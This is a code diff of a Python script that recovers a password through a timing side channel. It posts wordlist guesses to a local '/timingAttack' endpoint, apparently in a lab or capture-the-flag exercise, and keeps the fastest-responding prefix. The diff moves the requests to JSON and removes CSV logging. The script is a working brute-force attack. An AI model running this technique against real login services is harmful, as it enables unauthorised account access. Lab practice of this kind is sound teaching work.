@@ -1,7 +1,6 @@
 import requests
 import time
 from time import strftime
-import csv
 
 timingattack_url = "http://127.0.0.1:5000/timingAttack"
 curr_time = strftime("%Y-%m-%d_%H-%M-%S")
@@ -12,19 +11,13 @@ curr_time = strftime("%Y-%m-%d_%H-%M-%S")
 
 def post_c4(guess):
     start = time.perf_counter()
-    response = requests.post(url=timingattack_url, data={"password":guess})
+    response = requests.post(url=timingattack_url, headers={"Content-Type": "application/json"}, json={"password":guess})
     end = time.perf_counter()
 
     time_taken = end-start
-    response_arr = [time_taken,response.text]
+    response_arr = [time_taken,response]
 
     return response_arr
-
-# Initialize csv file
-#with open(f'timingAttack_{curr_time}.csv','w',newline='') as csvfile:
-    # fieldnames = ['Guess','Time']
-    # writer = csv.writer(csvfile)
-    # writer.writerow(fieldnames)
 
 
 timing_dict = {}
@@ -35,7 +28,6 @@ attempts = 8                                    # powers of 2 increments
 while guessing:
     with open("./wordlist.txt",mode='r') as wordlist:   # Read only
 
-
         for guess in wordlist:
             guess = prefix + guess.strip() 
             print("Current Guess: ", guess)
@@ -43,13 +35,13 @@ while guessing:
 
             for _ in range(attempts):
         
-                timetaken,result_text = post_c4(guess)
+                timetaken,result = post_c4(guess)
                 timings.append(timetaken)
-                if "success" in result_text:
+
+                if "Correct" in result.json()['Message']:
                     guessing = False
                     prefix = guess
                     break
-
 
             if guessing == False:
                 break                               # Need to exit all the loops- too lazy to refactor for something clever
@@ -67,6 +59,7 @@ while guessing:
         print("Guess With Lowest Time: ", guess_with_lowest_time)
         prefix = guess_with_lowest_time
         timing_dict = {}
+
 
 print("C4 Exploded!\n")
 print("Final Guess: ", prefix)
